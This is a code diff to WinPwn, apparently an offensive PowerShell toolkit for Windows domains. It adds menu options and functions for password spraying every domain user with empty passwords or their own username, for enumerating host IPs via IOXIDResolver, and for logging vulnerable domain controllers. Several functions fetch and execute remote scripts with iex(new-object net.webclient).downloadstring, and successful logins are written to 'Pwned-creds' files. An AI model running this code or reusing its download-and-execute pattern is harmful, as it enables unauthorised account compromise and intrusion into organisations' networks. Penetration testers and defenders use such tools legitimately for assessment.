@@ -1884,7 +1884,10 @@ __        ___       ____
 	Write-Host -ForegroundColor Green '17. Search for Resource-Based Constrained Delegation attack paths! '
 	Write-Host -ForegroundColor Green '18. Enumerate remote access policies through group policy! '
         Write-Host -ForegroundColor Green '19. Check all DCs for zerologon vulnerability! '
-        Write-Host -ForegroundColor Green '20. Exit. '
+	Write-Host -ForegroundColor Green '20. Check users for empty passwords! '
+	Write-Host -ForegroundColor Green '21. Check username=password combinations! '
+        Write-Host -ForegroundColor Green '22. Get network interface IPs of all domain systems via IOXIDResolver! '
+        Write-Host -ForegroundColor Green '23. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -1909,9 +1912,12 @@ __        ___       ____
 	     17{RBCD-Check}
 	     18{GPORemoteAccessPolicy}
          19{zerologon}
+	 20{Domainpassspray -emptypasswords}
+	 21{Domainpassspray -usernameaspassword}
+         22{Oxidresolver}
        }
     }
- While ($masterquestion -ne 20)
+ While ($masterquestion -ne 23)
 }
 
 function generaldomaininfo{
@@ -2138,6 +2144,24 @@ function Snaffler
     {
     	Invoke-Snaffler -command "-u"
     }
+}
+
+function oxidresolver
+{
+    [CmdletBinding()]
+
+    Param
+    (
+        [Switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+    )
+    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-OxidResolver.ps1')
+    if(!$consoleoutput){pathcheck}
+    if(!$consoleoutput){Invoke-Oxidresolver >> "$currentPath\DomainRecon\OxidBindings.txt"}
+    else{Invoke-Oxidresolver}
+
 }
 
 function Spoolvulnscan
@@ -2475,7 +2499,7 @@ function zerologon
                 {
                     Write-Host "Found vulnerable DC: " 
                     $domc
-                    if(!$consoleoutput){$domc > "$currentPath\Vulnerabilities\ZerologonvulnerableDC.txt"}
+                    if(!$consoleoutput){$domc >> "$currentPath\Vulnerabilities\ZerologonvulnerableDC.txt"}
 
                 }
 	       }
@@ -3167,19 +3191,39 @@ function Domainpassspray
         $noninteractive,
         [Switch]
         $consoleoutput,
+	[Switch]
+        $emptypasswords,
+	[Switch]
+        $usernameaspassword,
         [String]
         $password   
     )
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-
-    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
-	
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/DomainPasswordSpray.ps1')
-    if(!$consoleoutput){Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii $currentPath\DomainRecon\userlist.txt}else{$list = Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts}
-       if (Test-Path $currentPath\passlist.txt) 
+    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
+    
+    if ($emptypasswords)
+    {
+    	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1')
+ 	if(!$consoleoutput){Invoke-SprayEmptyPassword -outfile $currentPath\Exploitation\EmptyPasswords.txt}
+	else
+	{
+		Invoke-SprayEmptyPassword
+	}
+    }
+    elseif($usernameaspassword)
+    {
+        if(!$consoleoutput){Get-DomainUserList -Domain $domain.Name | Out-File -Encoding ascii $currentPath\DomainRecon\userlist.txt}else{$list = Get-DomainUserList -Domain $domain.Name}
+        if(!$consoleoutput){Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -UsernameAsPassword -Domain $domain.Name -OutFile $currentPath\Exploitation\UsernameAsPasswordCreds.txt}else{Invoke-DomainPasswordSpray -UserList $list -Domain $domain.Name -UsernameAsPassword}  
+        if(!$consoleoutput){Write-Host "Successfull logins saved to $currentPath\Exploitation\UsernameAsPasswordCreds.txt"} 
+    }
+    else
+    {    	  	
+    	if(!$consoleoutput){Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii $currentPath\DomainRecon\userlist.txt}else{$list = Get-DomainUserList -Domain $domain.Name -RemoveDisabled -RemovePotentialLockouts}
+       	if (Test-Path $currentPath\passlist.txt) 
         {
-            Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain_Name.Name -PasswordList $currentPath\passlist.txt -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt
+        	Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain_Name.Name -PasswordList $currentPath\passlist.txt -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt
         }
         else 
         { 
@@ -3187,6 +3231,7 @@ function Domainpassspray
            if(!$consoleoutput){Invoke-DomainPasswordSpray -UserList $currentPath\DomainRecon\userlist.txt -Domain $domain.Name -Password $onepass -OutFile $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt}else{Invoke-DomainPasswordSpray -UserList $list -Domain $domain.Name -Password $password}  
            if(!$consoleoutput){Write-Host "Successfull logins saved to $currentPath\Exploitation\Pwned-creds_Domainpasswordspray.txt"}
 	}
+   }
 }
 
 function launcher
